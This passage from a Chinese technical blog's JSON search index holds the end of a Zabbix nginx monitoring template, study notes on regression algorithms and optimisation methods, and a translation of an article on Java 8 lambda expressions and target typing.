&lt;key&gt;nginx.status[accepts]&lt;/key&gt; &lt;/item&gt; &lt;/graph_item&gt; &lt;graph_item&gt; &lt;sortorder&gt;1&lt;/sortorder&gt; &lt;drawtype&gt;0&lt;/drawtype&gt; &lt;color&gt;C80000&lt;/color&gt; &lt;yaxisside&gt;0&lt;/yaxisside&gt; &lt;calc_fnc&gt;2&lt;/calc_fnc&gt; &lt;type&gt;0&lt;/type&gt; &lt;item&gt; &lt;host&gt;Template App NGINX&lt;/host&gt; &lt;key&gt;nginx.status[handled]&lt;/key&gt; &lt;/item&gt; &lt;/graph_item&gt; &lt;graph_item&gt; &lt;sortorder&gt;2&lt;/sortorder&gt; &lt;drawtype&gt;0&lt;/drawtype&gt; &lt;color&gt;0000C8&lt;/color&gt; &lt;yaxisside&gt;0&lt;/yaxisside&gt; &lt;calc_fnc&gt;2&lt;/calc_fnc&gt; &lt;type&gt;0&lt;/type&gt; &lt;item&gt; &lt;host&gt;Template App NGINX&lt;/host&gt; &lt;key&gt;nginx.status[requests]&lt;/key&gt; &lt;/item&gt; &lt;/graph_item&gt; &lt;/graph_items&gt; &lt;/graph&gt; &lt;/graphs&gt;&lt;/zabbix_export&gt;","link":"/2016/10/06/zabbix%E7%9B%91%E6%8E%A7nginx/"},{"title":"机器学习（一）：回归算法","text":"持续更新中。。。 示例代码 什么是回归算法 回归算法推导：目标函数、对数似然及最小二乘 回归怎么预防过拟合 回归要调的参数有哪些 局部加权回归 Softmax回归 梯度的定义 什么是梯度下降？为什么要用梯度下降 梯度下降法容易收敛到局部最优，为什么应用广泛 梯度下降法找到的一定是下降最快的方向么 BGD、SGD、MBGD介绍与区别 BGD、SGD、MBGD的推导 牛顿法 拟牛顿法 牛顿法和梯度下降法的区别 共轭梯度 什么是正则化？L1正则与L2正则介绍 正则化为什么可以防止过拟合 L1和L2正则先验分别服从什么分布 简单介绍下LR LR与线性回归的区别与联系 LR模型为什么要使用sigmoid函数 逻辑回归相关问题 逻辑回归为什么要对特征进行离散化 逻辑回归并行化怎么做，有几种并行化方式，读过哪些开源的实现 什么是回归算法回归算法是一种比较常用的机器学习算法，用来建立”解释”变量和观测值之间的关系；从机器学习的角度来讲，就是通过学习，构建一个算法模型(函数)，来做属性与标签之间的映射关系。 回归算法中算法(函数)的最终结果是一个 连续 的数据值，输入值(属性值)是一个d维度的属性/数值向量。 回归涉及的算法模型：线性回归(Linear)、岭回归(Ridge)、LASSO回归、Elastic Net弹性网络算法正则化：L1-norm、L2-norm损失函数/目标函数：θ求解方式：最小二乘法(直接计算，目标函数是平方和损失函数)、梯度下降(BGD\\SGD\\MBGD) 广义线性模型对样本要求不必要服从正态分布、只需要服从指数分布簇(二项分布、泊松分布、伯努利分布、指数分布等)即可；广义线性模型的自变量可以是连续的也可以是离散的。 BGD、SGD、MBGD介绍与区别 BGD：批量梯度下降法 Batch Gradient Descent更新每一参数时都使用所有的样本来进行更新。优点：全局最优解；易于并行实现；缺点：当样本数目很多时，训练过程会很慢。 SGD：随机梯度下降法 Stochastic Gradient Descent随机梯度下降是通过每个样本来迭代更新一次，如果样本量很大的情况（例如几十万），那么可能只用其中几万条或者几千条的样本，就已经将theta迭代到最优解了，对比上面的批量梯度下降，迭代一次需要用到十几万训练样本，一次迭代不可能最优，如果迭代10次的话就需要遍历训练样本10次。但是，SGD伴随的一个问题是噪音较BGD要多，使得SGD并不是每次迭代都向着整体最优化方向。优点：训练速度快；缺点：准确度下降，并不是全局最优；不易于并行实现。 MBGD：小批量梯度下降法 Mini-batch Gradient Descent。如果即需要保证算法的训练速度，又需要保证最终参数训练的准确率，可以采取折衷方案MBGD。MBGD在每次更新参数时使用b个样本（b一般为10）。 BGD和SGD比较1）SGD速度比BGD快(迭代次数少)2）SGD在某些情况下(全局存在多个相对最优解/J(θ)不是一个二次)有可能跳出某些小的局部最优解，所以不会比BGD坏3）BGD一定能够得到一个局部最优解(在线性回归模型中一定是得到一个全局最优解)，SGD由于随机性的存在可能导致最终结果比BGD的差注意：两者优先选择SGD 损失函数：$J{train}(\\theta)=1/(2m)\\sum{i=1}^{m}(h_{\\theta}(x^{(i)})-y^{(i)})^{2}$ 回归要调的参数有哪些对于各种算法模型(线性回归)来讲，我们需要获取θ、λ、p的值；θ的求解其实就是算法模型的求解，一般不需要开发人员参与(算法已经实现)，主要需要求解的是λ和p的值，这个过程就叫做调参(超参) 局部加权回归普通线性回归损失函数：局部加权回归损失函数： $W^i$是权重，它根据要预测的点与数据集中的点的距离来为数据集中的点赋权值。当某点离要预测的点越远，其权重越小，否则越大。常用值选择公式为： 该函数称为指数衰减函数，其中k为波长参数，它控制了权值随距离下降的速率注意：使用该方式主要应用到样本之间的相似性考虑，主要内容在SVM中再考虑(核函数) Softmax回归Softmax回归是logistic回归的一般化，适用于K分类的问题，第k类的参数为向量$θ_k$ ，组成的二维矩阵为$θ_k*n$ 。Softmax函数的本质就是将一个K维的任意实数向量压缩（映射）成另一个K维的实数向量，其中向量中的每个元素取值都介于（0，1）之间。 softmax回归概率函数为： 什么是正则化？L1正则与L2正则介绍为了防止过拟合，在成本函数中加入一个正则项，惩罚模型的复杂度。 Logistic 回归中的正则化对于 Logistic 回归，加入 L2 正则化（也称“L2 范数”）的成本函数： J(w,b) = \\frac{1}{m}\\sum_{i=1}^mL(\\hat{y}^{(i)},y^{(i)})+\\frac{\\lambda}{2m}{||w||}^2_2 L1 正则化（LASSO回归 Least Absolute Shrinkage and Selection Operator）：\\frac{\\lambda}{2m}{||w||}_1 = \\frac{\\lambda}{2m}\\sum_{j=1}^{n_x}{|w_j|} L2 正则化（Ridge回归 岭回归）：\\frac{\\lambda}{2m}{||w||}^2_2 = \\frac{\\lambda}{2m}\\sum_{j=1}^{n_x}w^2_j = \\frac{\\lambda}{2m}w^Tw 其中，λ 为正则化因子，是超参数。注意，lambda在 Python 中属于保留字，所以在编程的时候，用lambd代替这里的正则化因子。 L1范数可以使权值稀疏，方便特征提取。 L2范数可以防止过拟合，提升模型的泛化能力。 L2-norm（岭回归）中，由于对于各个维度的参数缩放是在一个圆内缩放的，不可能导致有维度参数变为0的情况，那么也就不会产生稀疏解；实际应用中，数据的维度中是存在噪音和冗余的，L1（LASSO回归）稀疏的解可以找到有用的维度并且减少冗余，因此LASSO模型也具有较高的求解速度 同时使用L1正则和L2正则的线性回归模型就称为Elasitc Net算法(弹性网络算法) 正则化为什么可以防止过拟合正则化是在成本函数中加入一个正则化项，惩罚模型的复杂度。是针对过拟合而提出的。 直观解释正则化因子设置的足够大的情况下，为了使成本函数最小化，相应的参数就会被调小，甚至接近于0值，直观上相当于消除了很多特征值的影响。而且一般情况下参数越小(或者特征值越少)，函数越光滑，模型越简单，奥卡姆剃刀原理。 其他解释在权值 w变小之下，输入样本 X 随机的变化不会对模型造成过大的影响，模型受局部噪音的影响的可能性变小。这就是正则化能够降低模型方差的原因。 神经网络防止过拟合还有一种数学解释，即每层权重变小，在 z 较小（接近于 0）的区域里，tanh(z)函数就近似线性，所以每层的函数就近似线性函数，所以防止过拟合。 L1和L2正则先验分别服从什么分布面试中遇到的，L1和L2正则先验分别服从什么分布，L1是拉普拉斯分布，L2是高斯分布。 先验就是优化的起跑线， 有先验的好处就是可以在较小的数据集中有良好的泛化性能，当然这是在先验分布是接近真实分布的情况下得到的了，从信息论的角度看，向系统加入了正确先验这个信息，肯定会提高系统的性能。对参数引入高斯正态先验分布相当于L2正则化， 这个大家都熟悉：对参数引入拉普拉斯先验等价于 L1正则化， 如下图：从上面两图可以看出， L2先验趋向零周围， L1先验趋向零本身。 梯度的定义 什么是梯度下降？为什么要用梯度下降推荐一篇文章：吴恩达机器学习线性回归总结 梯度下降法（gradient descent）是解决无约束优化问题的最简单和最古老的方法之一，常用在机器学习中 逼近最小偏差。搜索方向为梯度的负方向，越接近目标值，步长越小，前进越慢。 X1，X2..Xn 描述的是feature里面的分量，比如x1=房间的面积，x2=房间的朝向等等。θ是我们要调的参数，通过调整θ可以控制feature中每个分量的影响力。 损失函数J(θ)是用来判断θ取值是否比较好。换言之，我们把对x(i)的估计值与真实值y(i)差的平方和作为损失函数，前面乘上的1/2是为了在求导的时候，这个系数就不见了。 如何调整θ以使得J(θ)取得最小值有很多方法，其中有最小二乘法(min square)，另外一种就是梯度下降法。 梯度下降法的算法流程：1）首先对θ赋值，这个值可以是随机的，也可以让θ是一个全零的向量。2）改变θ的值，使得J(θ)按梯度下降的方向进行减少。 为了描述的更清楚，给出下面的图： 这是一个表示参数θ与误差函数J(θ)的关系图，红色的部分是表示J(θ)有着比较高的取值，我们需要的是，能够让J(θ)的值尽量的低，也就是达到深蓝色的部分。θ0，θ1表示θ向量的两个维度。在上面提到梯度下降法的第一步是给θ给一个初值，假设随机给的初值是在图上的十字点。然后我们将θ按照梯度下降的方向进行调整，就会使得J(θ)往更低的方向进行变化，如下图所示，算法的结束将是在θ下降到无法继续下降为止。 当然，可能梯度下降的最终点并非是全局最小点，即也可能是一个局部最小点，如下图所示： 上面这张图就是描述的一个局部最小点，这是我们重新选择了一个初始点得到的，看来我们这个算法将会在很大的程度上被初始点的选择影响而陷入局部最小点。下面我将用一个例子描述一下梯度减少的过程，对于我们的函数J(θ)求偏导J： 下面是更新的过程，也就是θi会向着梯度最小的方向进行减少。θi表示更新之前的值，-后面的部分表示按梯度方向减少的量，α表示步长，也就是每次按照梯度减少的方向变化多少。 一个很重要的地方值得注意的是，梯度是有方向的，对于一个向量θ，每一维分量θi都可以求出一个梯度的方向，我们就可以找到一个整体的方向，在变化的时候，我们就朝着下降最多的方向进行变化就可以达到一个最小点，不管它是局部的还是全局的。 梯度下降法容易收敛到局部最优，为什么应用广泛深度神经网络“容易收敛到局部最优”，很可能是一种想象，实际情况是，你可能从来没有找到过“局部最优”，更别说全局最优了。 大部分情况你达到的是 鞍点，鞍点详解见我的深度学习笔记 梯度下降法找到的一定是下降最快的方向么梯度下降法并不是下降最快的方向，它只是目标函数在当前点的切平面下降最快的方向。一般认为牛顿方向（考虑海森距离）才是下降最快的方向。 牛顿法和梯度下降法的区别效率对比：（a）从收敛速度上看 ，牛顿法是二阶收敛，梯度下降是一阶收敛，前者牛顿法收敛速度更快。但牛顿法仍然是局部算法，只是在局部上看的更细致，梯度法仅考虑方向，牛顿法不但考虑了方向还兼顾了步子的大小，其对步长的估计使用的是二阶逼近。（b）根据wiki上的解释，从几何上说，牛顿法就是用一个二次曲面去拟合你当前所处位置的局部曲面，而梯度下降法是用一个平面去拟合当前的局部曲面，通常情况下，二次曲面的拟合会比平面更好，所以牛顿法选择的下降路径会更符合真实的最优下降路径。 牛顿法的优缺点总结：优点：二阶收敛，收敛速度快；缺点：函数必须具有连续的一阶二阶偏导数，海森矩阵必须正定。其次计算非常复杂。 共轭梯度共轭：两个概率分布如果具有相同的形式，我们就说它们是共轭的 共轭梯度法是介于梯度下降法（最速下降法）与牛顿法之间的一个方法，它仅需利用一阶导数信息，但克服了梯度下降法收敛慢的缺点，又避免了牛顿法需要存储和计算Hessian矩阵并求逆的缺点，共轭梯度法不仅是解决大型线性方程组最有用的方法之一，也是解大型非线性最优化最有效的算法之一。在各种优化算法中，共轭梯度法是非常重要的一种。其优点是所需存储量小，具有逐步收敛性，稳定性高，而且不需要任何外来参数。 下图为共轭梯度法和梯度下降法搜索最优解的路径对比示意图： 注：绿色为梯度下降法，红色代表共轭梯度法 简单介绍下LR1）吴恩达机器学习逻辑回归总结2）Logistic Regression 的前世今生3）机器学习算法与Python实践之七-逻辑回归 把LR从头到脚都给讲一遍。建模，现场数学推导，每种解法的原理，正则化，LR和maxent模型啥关系，lr为啥比线性回归好。有不少会背答案的人，问逻辑细节就糊涂了。原理都会? 那就问工程，并行化怎么做，有几种并行化方式，读过哪些开源的实现。还会，那就准备收了吧，顺便逼问LR模型发展历史。 LR与线性回归的区别与联系整理中。。。 LR 工业上一般指Logistic Regression（逻辑回归）而不是Linear Regression（线性回归）。LR在线性回归的实数范围输出值上施加 sigmoid 函数将值收敛到 0~1 范围，其目标函数也因此从差平方和函数变为对数损失函数，以提供最优化所需导数（sigmoid函数是softmax函数的二元特例， 其导数均为函数值的f*(1-f)形式）。 请注意， LR 往往是解决二元 0/1 分类问题的， 只是它和线性回归耦合太紧， 不自觉也冠了个回归的名字。若要求多元分类，就要把sigmoid换成大名鼎鼎的softmax了。 个人感觉逻辑回归和线性回归首先都是广义的线性回归， 其次经典线性模型的优化目标函数是最小二乘，而逻辑回归则是似然函数， 另外线性回归在整个实数域范围内进行预测，敏感度一致，而分类范围，需要在[0，1]。逻辑回归就是一种减小预测范围，将预测值限定为[0，1]间的一种回归模型，因而对于这类问题来说，逻辑回归的鲁棒性比线性回归的要好。 逻辑回归的模型本质上是一个线性回归模型，逻辑回归都是以线性回归为理论支持的。但线性回归模型无法做到sigmoid的非线性形式，sigmoid可以轻松处理0/1分类问题。 LR模型为什么要使用sigmoid函数假设W已知，现有函数 P(y|x) = f(wx)，求分布f，使得在正样本里 P(y=1|w,x)尽可能大，在负样本里尽可能小。根据最大熵原则，我们知道所有可能的分布模型集合中，熵最大的模型是最好的模型。即对未知分布最合理的推断就是符合已有前提下最不确定或最随机的推断。又已知LR符合伯努利分布，将伯努利分布转换为指数分布的过程中，可以得到sigmod函数，这就是LR的理论基础。 LR模型使用sigmoid函数背后的数学原理是什么？ 广义线性模型 什么是最大熵 逻辑回归相关问题（3）L1-norm和L2-norm 其实稀疏的根本还是在于L0-norm也就是直接统计参数不为0的个数作为规则项，但实际上却不好执行于是引入了L1-norm；而L1norm本质上是假设参数先验是服从Laplace分布的，而L2-norm是假设参数先验为Gaussian分布，我们在网上看到的通常用图像来解答这个问题的原理就在这。 但是L1-norm的求解比较困难，可以用坐标轴下降法或是最小角回归法求解。 （4）LR和SVM对比 首先，LR和SVM最大的区别在于损失函数的选择，LR的损失函数为Log损失（或者说是逻辑损失都可以）、而SVM的损失函数为hinge loss。 其次，两者都是线性模型。 最后，SVM只考虑支持向量（也就是和分类相关的少数点） （5）LR和随机森林区别 随机森林等树算法都是非线性的，而LR是线性的。LR更侧重全局优化，而树模型主要是局部的优化。 （6）常用的优化方法 逻辑回归本身是可以用公式求解的，但是因为需要求逆的复杂度太高，所以才引入了梯度下降算法。 一阶方法：梯度下降、随机梯度下降、mini 随机梯度下降降法。随机梯度下降不但速度上比原始梯度下降要快，局部最优化问题时可以一定程度上抑制局部最优解的发生。 二阶方法：牛顿法、拟牛顿法： 这里详细说一下牛顿法的基本原理和牛顿法的应用方式。牛顿法其实就是通过切线与x轴的交点不断更新切线的位置，直到达到曲线与x轴的交点得到方程解。在实际应用中我们因为常常要求解凸优化问题，也就是要求解函数一阶导数为0的位置，而牛顿法恰好可以给这种问题提供解决方法。实际应用中牛顿法首先选择一个点作为起始点，并进行一次二阶泰勒展开得到导数为0的点进行一个更新，直到达到要求，这时牛顿法也就成了二阶求解问题，比一阶方法更快。我们常常看到的x通常为一个多维向量，这也就引出了Hessian矩阵的概念（就是x的二阶导数矩阵）。 缺点：牛顿法是定长迭代，没有步长因子，所以不能保证函数值稳定的下降，严重时甚至会失败。还有就是牛顿法要求函数一定是二阶可导的。而且计算Hessian矩阵的逆复杂度很大。 拟牛顿法：不用二阶偏导而是构造出Hessian矩阵的近似正定对称矩阵的方法称为拟牛顿法。拟牛顿法的思路就是用一个特别的表达形式来模拟Hessian矩阵或者是他的逆使得表达式满足拟牛顿条件。主要有DFP法（逼近Hession的逆）、BFGS（直接逼近Hession矩阵）、 L-BFGS（可以减少BFGS所需的存储空间）。 逻辑回归为什么要对特征进行离散化在工业界，很少直接将连续值作为逻辑回归模型的特征输入，而是将连续特征离散化为一系列0、1特征交给逻辑回归模型，这样做的优势有以下几点： 离散特征的增加和减少都很容易，易于模型的快速迭代； 稀疏向量内积乘法运算速度快，计算结果方便存储，容易扩展； 离散化后的特征对异常数据有很强的鲁棒性：比如一个特征是年龄&gt;30是1，否则0。如果特征没有离散化，一个异常数据“年龄300岁”会给模型造成很大的干扰； 逻辑回归属于广义线性模型，表达能力受限；单变量离散化为N个后，每个变量有单独的权重，相当于为模型引入了非线性，能够提升模型表达能力，加大拟合； 离散化后可以进行特征交叉，由M+N个变量变为M*N个变量，进一步引入非线性，提升表达能力； 特征离散化后，模型会更稳定，比如如果对用户年龄离散化，20-30作为一个区间，不会因为一个用户年龄长了一岁就变成一个完全不同的人。当然处于区间相邻处的样本会刚好相反，所以怎么划分区间是门学问； 特征离散化以后，起到了简化了逻辑回归模型的作用，降低了模型过拟合的风险。李沐曾经说过：模型是使用离散特征还是连续特征，其实是一个“海量离散特征+简单模型” 同 “少量连续特征+复杂模型”的权衡。既可以离散化用线性模型，也可以用连续特征加深度学习。就看是喜欢折腾特征还是折腾模型了。通常来说，前者容易，而且可以n个人一起并行做，有成功经验；后者目前看很赞，能走多远还须拭目以待。 逻辑回归并行化怎么做，有几种并行化方式，读过哪些开源的实现http://www.csdn.net/article/2014-02-13/2818400-2014-02-13","link":"/2017/10/19/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9A%E5%9B%9E%E5%BD%92%E7%AE%97%E6%B3%95/"},{"title":"Lambda语言篇 —— lambda, 方法引用, 目标类型和默认方法","text":"本文介绍了Java SE 8中新引入的lambda语言特性以及这些特性背后的设计思想。这些特性包括： lambda表达式（又被成为“闭包”或“匿名方法”） 方法引用和构造方法引用 扩展的目标类型和类型推导 接口中的默认方法和静态方法 本文是对 Brian Goetz 的 State of the Lambda 一文的翻译。 背景Java是一门面向对象编程语言。面向对象编程语言和函数式编程语言中的基本元素（Basic Values）都可以动态封装程序行为：面向对象编程语言使用带有方法的对象封装行为，函数式编程语言使用函数封装行为。但这个相同点并不明显，因为Java的对象往往比较“重量级”：实例化一个类型往往会涉及不同的类，并需要初始化类里的字段和方法。 不过有些Java对象只是对单个函数的封装。例如下面这个典型用例：Java API中定义了一个接口（一般被称为回调接口），用户通过提供这个接口的实例来传入指定行为，例如：123public interface ActionListener { void actionPerformed(ActionEvent e);} 这里并不需要专门定义一个类来实现ActionListener接口，因为它只会在调用处被使用一次。用户一般会使用匿名类型把行为内联（inline）：12345button.addActionListener(new ActionListener) { public void actionPerformed(ActionEvent e) { ui.dazzle(e.getModifiers()); }} 很多库都依赖于上面的模式。对于并行API更是如此，因为我们需要把待执行的代码提供给并行API，并行编程是一个非常值得研究的领域，因为在这里摩尔定律得到了重生：尽管我们没有更快的CPU核心（core），但是我们有更多的CPU核心。而串行API就只能使用有限的计算能力。 随着回调模式和函数式编程风格的日益流行，我们需要在Java中提供一种尽可能轻量级的将代码封装为数据（Model code as data）的方法。匿名内部类并不是一个好的选择，因为： 语法过于冗余 匿名类中的this和变量名容易使人产生误解 类型载入和实例创建语义不够灵活 无法捕获非final的局部变量 无法对控制流进行抽象 上面的多数问题均在Java SE 8中得以解决：通过提供更简洁的语法和局部作用域规则，Java SE 8彻底解决了问题1和问题2通过提供更加灵活而且便于优化的表达式语义，Java SE 8绕开了问题3通过允许编译器推断变量的“常量性”（finality），Java SE 8减轻了问题4带来的困扰 不过，Java SE 8的目标并非解决所有上述问题。因此捕获可变变量（问题4）和非局部控制流（问题5）并不在Java SE 8的范畴之内。（尽管我们可能会在未来提供对这些特性的支持） 函数式接口(Functional interfaces)尽管匿名内部类有着种种限制和问题，但是它有一个良好的特性，它和Java类型系统结合的十分紧密：每一个函数对象都对应一个接口类型。之所以说这个特性是良好的，是因为： 接口是Java类型系统的一部分 接口天然就拥有其运行时表示（Runtime representation） 接口可以通过Javadoc注释来表达一些非正式的协定（contract），例如，通过注释说明该操作应可交换（commutative） 上面提到的ActionListener接口只有一个方法，大多数回调接口都拥有这个特征：比如Runnable接口和Comparator接口。我们把这些只拥有一个方法的接口称为函数式接口。（之前它们被称为SAM类型，即单抽象方法类型（Single Abstract Method）） 我们并不需要额外的工作来声明一个接口是函数式接口：编译器会根据接口的结构自行判断（判断过程并非简单的对接口方法计数：一个接口可能冗余的定义了一个Object已经提供的方法，比如toString()，或者定义了静态方法或默认方法，这些都不属于函数式接口方法的范畴）。不过API作者们可以通过@FunctionalInterface注解来显式指定一个接口是函数式接口（以避免无意声明了一个符合函数式标准的接口），加上这个注解之后，编译器就会验证该接口是否满足函数式接口的要求。 实现函数式类型的另一种方式是引入一个全新的结构化函数类型，我们也称其为“箭头”类型。例如，一个接收String和Object并返回int的函数类型可以被表示为(String, Object) -&gt; int。我们仔细考虑了这个方式，但出于下面的原因，最终将其否定： 它会为Java类型系统引入额外的复杂度，并带来结构类型（Structural Type）和指名类型（Nominal Type）的混用。（Java几乎全部使用指名类型） 它会导致类库风格的分歧——一些类库会继续使用回调接口，而另一些类库会使用结构化函数类型 它的语法会变得十分笨拙，尤其在包含受检异常（checked exception）之后 每个函数类型很难拥有其运行时表示，这意味着开发者会受到类型擦除（erasure）的困扰和局限。比如说，我们无法对方法m(T-&gt;U)和m(X-&gt;Y)进行重载（Overload） 所以我们选择了“使用已知类型”这条路——因为现有的类库大量使用了函数式接口，通过沿用这种模式，我们使得现有类库能够直接使用lambda表达式。例如下面是Java SE 7中已经存在的函数式接口： java.lang.Runnable java.util.concurrent.Callable java.security.PrivilegedAction java.util.Comparator java.io.FileFilter java.beans.PropertyChangeListener 除此之外，Java SE 8中增加了一个新的包：java.util.function，它里面包含了常用的函数式接口，例如： Predicate——接收T对象并返回boolean Consumer——接收T对象，不返回值 Function——接收T对象，返回R对象 Supplier——提供T对象（例如工厂），不接收值 UnaryOperator——接收T对象，返回T对象 BinaryOperator——接收两个T对象，返回T对象 除了上面的这些基本的函数式接口，我们还提供了一些针对原始类型（Primitive type）的特化（Specialization）函数式接口，例如IntSupplier和LongBinaryOperator。（我们只为int、long和double提供了特化函数式接口，如果需要使用其它原始类型则需要进行类型转换）同样的我们也提供了一些针对多个参数的函数式接口，例如BiFunction，它接收T对象和U对象，返回R对象。 lambda表达式(lambda expressions)匿名类型最大的问题就在于其冗余的语法。有人戏称匿名类型导致了“高度问题”（height problem）：比如前面ActionListener的例子里的五行代码中仅有一行在做实际工作。 lambda表达式是匿名方法，它提供了轻量级的语法，从而解决了匿名内部类带来的“高度问题”。 下面是一些lambda表达式：123(int x, int y) -&gt; x + y() -&gt; 42(String s) -&gt; { System.out.println(s); } 第一个lambda表达式接收x和y这两个整形参数并返回它们的和；第二个lambda表达式不接收参数，返回整数’42’；第三个lambda表达式接收一个字符串并把它打印到控制台，不返回值。 lambda表达式的语法由参数列表、箭头符号-&gt;和函数体组成。函数体既可以是一个表达式，也可以是一个语句块： 表达式：表达式会被执行然后返回执行结果。 语句块：语句块中的语句会被依次执行，就像方法中的语句一样—— return语句会把控制权交给匿名方法的调用者 break和continue只能在循环中使用 如果函数体有返回值，那么函数体内部的每一条路径都必须返回值 表达式函数体适合小型lambda表达式，它消除了return关键字，使得语法更加简洁。 lambda表达式也会经常出现在嵌套环境中，比如说作为方法的参数。为了使lambda表达式在这些场景下尽可能简洁，我们去除了不必要的分隔符。不过在某些情况下我们也可以把它分为多行，然后用括号包起来，就像其它普通表达式一样。 下面是一些出现在语句中的lambda表达式：12345678FileFilter java = (File f) -&gt; f.getName().endsWith(\"*.java\");String user = doPrivileged(() -&gt; System.getProperty(\"user.name\"));new Thread(() -&gt; { connectToService(); sendNotification();}).start(); 目标类型(Target typing)需要注意的是，函数式接口的名称并不是lambda表达式的一部分。那么问题来了，对于给定的lambda表达式，它的类型是什么？答案是：它的类型是由其上下文推导而来。例如，下面代码中的lambda表达式类型是ActionListener：1ActionListener l = (ActionEvent e) -&gt; ui.dazzle(e.getModifiers()); 这就意味着同样的lambda表达式在不同上下文里可以拥有不同的类型：123Callable&lt;String&gt; c = () -&gt; \"done\";PrivilegedAction&lt;String&gt; a = () -&gt; \"done\"; 第一个lambda表达式() -&gt; “done”是Callable的实例，而第二个lambda表达式则是PrivilegedAction的实例。 编译器负责推导lambda表达式的类型。它利用lambda表达式所在上下文所期待的类型进行推导，这个被期待的类型被称为目标类型。lambda表达式只能出现在目标类型为函数式接口的上下文中。 当然，lambda表达式对目标类型也是有要求的。编译器会检查lambda表达式的类型和目标类型的方法签名（method signature）是否一致。当且仅当下面所有条件均满足时，lambda表达式才可以被赋给目标类型T： T是一个函数式接口 lambda表达式的参数和T的方法参数在数量和类型上一一对应 lambda表达式的返回值和T的方法返回值相兼容（Compatible） lambda表达式内所抛出的异常和T的方法throws类型相兼容 由于目标类型（函数式接口）已经“知道”lambda表达式的形式参数（Formal parameter）类型，所以我们没有必要把已知类型再重复一遍。也就是说，lambda表达式的参数类型可以从目标类型中得出：1Comparator&lt;String&gt; c = (s1, s2) -&gt; s1.compareToIgnoreCase(s2); 在上面的例子里，编译器可以推导出s1和s2的类型是String。此外，当lambda的参数只有一个而且它的类型可以被推导得知时，该参数列表外面的括号可以被省略：123FileFilter java = f -&gt; f.getName().endsWith(\".java\");button.addActionListener(e -&gt; ui.dazzle(e.getModifiers())); 这些改进进一步展示了我们的设计目标：“不要把高度问题转化成宽度问题。”我们希望语法元素能够尽可能的少，以便代码的读者能够直达lambda表达式的核心部分。 lambda表达式并不是第一个拥有上下文相关类型的Java表达式：泛型方法调用和“菱形”构造器调用也通过目标类型来进行类型推导：12345List&lt;String&gt; ls = Collections.emptyList();List&lt;Integer&gt; li = Collections.emptyList();Map&lt;String, Integer&gt; m1 = new HashMap&lt;&gt;();Map&lt;Integer, String&gt; m2 = new HashMap&lt;&gt;(); 目标类型的上下文(Contexts for target typing)之前我们提到lambda表达式智能出现在拥有目标类型的上下文中。下面给出了这些带有目标类型的上下文： 变量声明 赋值 返回语句 数组初始化器 方法和构造方法的参数 lambda表达式函数体 条件表达式（? :） 转型（Cast）表达式 在前三个上下文（变量声明、赋值和返回语句）里，目标类型即是被赋值或被返回的类型：12345678Comparator&lt;String&gt; c;c = (String s1, String s2) -&gt; s1.compareToIgnoreCase(s2);public Runnable toDoLater() { return () -&gt; { System.out.println(\"later\"); }} 数组初始化器和赋值类似，只是这里的“变量”变成了数组元素，而类型是从数组类型中推导得知：123filterFiles(new FileFilter[] { f -&gt; f.exists(), f -&gt; f.canRead(), f -&gt; f.getName().startsWith(\"q\") }); 方法参数的类型推导要相对复杂些：目标类型的确认会涉及到其它两个语言特性：重载解析（Overload resolution）和参数类型推导（Type argument inference）。 重载解析会为一个给定的方法调用（method invocation）寻找最合适的方法声明（method declaration）。由于不同的声明具有不同的签名，当lambda表达式作为方法参数时，重载解析就会影响到lambda表达式的目标类型。编译器会通过它所得之的信息来做出决定。如果lambda表达式具有显式类型（参数类型被显式指定），编译器就可以直接 使用lambda表达式的返回类型；如果lambda表达式具有隐式类型（参数类型被推导而知），重载解析则会忽略lambda表达式函数体而只依赖lambda表达式参数的数量。 如果在解析方法声明时存在二义性（ambiguous），我们就需要利用转型（cast）或显式lambda表达式来提供更多的类型信息。如果lambda表达式的返回类型依赖于其参数的类型，那么lambda表达式函数体有可能可以给编译器提供额外的信息，以便其推导参数类型。12List&lt;Person&gt; ps = ...Stream&lt;String&gt; names = ps.stream().map(p -&gt; p.getName()); 在上面的代码中，ps的类型是List，所以ps.stream()的返回类型是Stream。map()方法接收一个类型为Function的函数式接口，这里T的类型即是Stream元素的类型，也就是Person，而R的类型未知。由于在重载解析之后lambda表达式的目标类型仍然未知，我们就需要推导R的类型：通过对lambda表达式函数体进行类型检查，我们发现函数体返回String，因此R的类型是String，因而map()返回Stream。绝大多数情况下编译器都能解析出正确的类型，但如果碰到无法解析的情况，我们则需要： 使用显式lambda表达式（为参数p提供显式类型）以提供额外的类型信息 把lambda表达式转型为Function 为泛型参数R提供一个实际类型。（.map(p -&gt; p.getName())） lambda表达式本身也可以为它自己的函数体提供目标类型，也就是说lambda表达式可以通过外部目标类型推导出其内部的返回类型，这意味着我们可以方便的编写一个返回函数的函数：1Supplier&lt;Runnable&gt; c = () -&gt; () -&gt; { System.out.println(\"hi\"); }; 类似的，条件表达式可以把目标类型“分发”给其子表达式：1Callable&lt;Integer&gt; c = flag ? (() -&gt; 23) : (() -&gt; 42); 最后，转型表达式（Cast expression）可以显式提供lambda表达式的类型，这个特性在无法确认目标类型时非常有用：12// Object o = () -&gt; { System.out.println(\"hi\"); }; 这段代码是非法的Object o = (Runnable) () -&gt; { System.out.println(\"hi\"); }; 除此之外，当重载的方法都拥有函数式接口时，转型可以帮助解决重载解析时出现的二义性。 目标类型这个概念不仅仅适用于lambda表达式，泛型方法调用和“菱形”构造方法调用也可以从目标类型中受益，下面的代码在Java SE 7是非法的，但在Java SE 8中是合法的：123List&lt;String&gt; ls = Collections.checkedList(new ArrayList&lt;&gt;(), String.class);Set&lt;Integer&gt; si = flag ? Collections.singleton(23) : Collections.emptySet(); 词法作用域(Lexical scoping)在内部类中使用变量名（以及this）非常容易出错。内部类中通过继承得到的成员（包括来自Object的方法）可能会把外部类的成员掩盖（shadow），此外未限定（unqualified）的this引用会指向内部类自己而非外部类。 相对于内部类，lambda表达式的语义就十分简单：它不会从超类（supertype）中继承任何变量名，也不会引入一个新的作用域。lambda表达式基于词法作用域，也就是说lambda表达式函数体里面的变量和它外部环境的变量具有相同的语义（也包括lambda表达式的形式参数）。此外，’this’关键字及其引用在lambda表达式内部和外部也拥有相同的语义。 为了进一步说明词法作用域的优点，请参考下面的代码，它会把”Hello, world!”打印两遍：1234567891011public class Hello { Runnable r1 = () -&gt; { System.out.println(this); } Runnable r2 = () -&gt; { System.out.println(toString()); } public String toString() { return \"Hello, world\"; } public static void main(String... args) { new Hello().r1.run(); new Hello().r2.run(); }} 与之相类似的内部类实现则会打印出类似Hello$1@5b89a773和Hello$2@537a7706之类的字符串，这往往会使开发者大吃一惊。 